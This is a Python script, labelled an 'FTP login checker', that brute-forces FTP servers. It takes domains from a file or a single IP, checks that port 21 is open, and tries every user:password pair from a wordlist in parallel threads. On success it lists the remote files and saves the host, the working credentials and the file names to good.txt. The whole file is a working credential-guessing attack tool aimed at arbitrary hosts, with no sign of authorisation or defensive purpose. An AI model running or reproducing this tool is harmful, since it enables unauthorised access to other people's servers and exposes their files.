import argparse
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
from colorama import Fore, Style, init
from ftplib import FTP
import os

init(autoreset=True)

def create_file_if_not_exists(filename):
    if not os.path.exists(filename):
        open(filename, 'w').close()

create_file_if_not_exists('domains.txt')
create_file_if_not_exists('good.txt')

logins_file = "logins.txt"
good_file = "good.txt"
domains_file = "domains.txt"
max_threads = 10

stop_event = threading.Event()
lock = threading.Lock()

def try_login(server, port, user, password):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((server, port))
        sock.recv(1024)
        sock.sendall(f"USER {user}\r\n".encode())
        sock.recv(1024) 

        sock.sendall(f"PASS {password}\r\n".encode())
        response = sock.recv(1024).decode()

        if "230" in response:
            ftp = FTP(server)
            ftp.login(user=user, passwd=password)
            files = ftp.nlst()
            print("Dir list:")
            if files:  
                print(", ".join(files))  
                return (user, password, files) 

    except Exception:
        return None
    finally:
        sock.close()

def remove_domain(domain):
    with lock:
        with open(domains_file, 'r') as f:
            lines = f.readlines()
        with open(domains_file, 'w') as f:
            for line in lines:
                if line.strip() != domain:
                    f.write(line)

def check_port_open(domain, port=21):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((domain, port))
            return True
    except (ConnectionRefusedError, OSError):
        return False
        
with open(logins_file, 'r') as f:
    login_pairs = [line.strip() for line in f.readlines()]

def is_domain_good(domain):
    with open(good_file, 'r') as good:
        good_domains = [line.split(' - ')[0] for line in good.readlines()]
    return domain in good_domains
    
def process_logins(domain):
    if not check_port_open(domain):
        remove_domain(domain)  
        return []

    remove_domain(domain)
    if is_domain_good(domain):
        print(f"{Fore.YELLOW}Domain {domain} already processed.{Style.RESET_ALL}")
        return []
    successful_logins = []

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {
            executor.submit(try_login, domain, 21, *login_pair.split(':')): login_pair
            for login_pair in login_pairs
        }

        for future in as_completed(futures):
            login_pair = futures[future]
            user, password = login_pair.split(':')
            output = f"\rDomain: {Fore.CYAN}{domain}{Style.RESET_ALL}, login: {Fore.GREEN}{user}{Style.RESET_ALL}, password: {Fore.RED}{password}{Style.RESET_ALL}"
            print(output, end='                                ', flush=True)

            result = future.result()
            if result:
                user, password, files = result  
                successful_logins.append((user, password, files))  

    if successful_logins:
        with lock:
            with open(good_file, 'a', encoding='utf-8') as good:  
                for user, password, files in successful_logins:
                    good.write(f"{domain} - {user}:{password} | Files: {', '.join(files)}\n")

    return successful_logins

def main():
    parser = argparse.ArgumentParser(description="FTP login checker")
    parser.add_argument("-ip", "--ip", help="Single IP address to check")
    parser.add_argument("-file", "--file", help="File with domains to check", default=domains_file)
    args = parser.parse_args()

    domains = []
    if args.ip:
        domains = [args.ip]
    elif args.file:
        with open(args.file, 'r') as f:
            domains = [line.strip() for line in f.readlines()]

    for domain in domains:
        found_logins = process_logins(domain)
        if found_logins:
            print(f"\nFinished for {Fore.CYAN}{domain}{Style.RESET_ALL}. Logpasses:")
            for user, password, files in found_logins:
                print(f" - {Fore.GREEN}{user}:{password} | Files: {', '.join(files)}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
